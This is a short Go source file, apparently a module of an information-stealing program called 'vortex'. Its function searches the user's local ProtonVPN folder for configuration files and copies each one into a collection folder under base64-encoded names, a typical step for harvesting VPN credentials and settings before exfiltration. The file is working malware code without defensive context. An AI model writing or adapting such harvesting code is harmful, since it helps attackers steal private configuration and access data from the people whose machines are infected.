package vpn

import (
	"os"
	"path/filepath"
	"vortex/encrypt"
	"vortex/hutil"
)

func ProtonvpnConfigCoping(mainFolder string) error {

	protonvpnPath := filepath.Join(os.Getenv("LOCALAPPDATA"), "ProtonVPN")

	protonvpnConfigs, err := hutil.FindFilesExt(protonvpnPath, ".config")
	if err != nil {
		if os.IsNotExist(err) {
			return nil
		}
		return err
	}

	for i := range protonvpnConfigs {
		if err = hutil.CopyFile(protonvpnConfigs[i], filepath.Join(mainFolder, encrypt.B64Util("protonvpn-"+filepath.Base(protonvpnConfigs[i]), 0))); err != nil {
			return err
		}
	}
	return nil
}
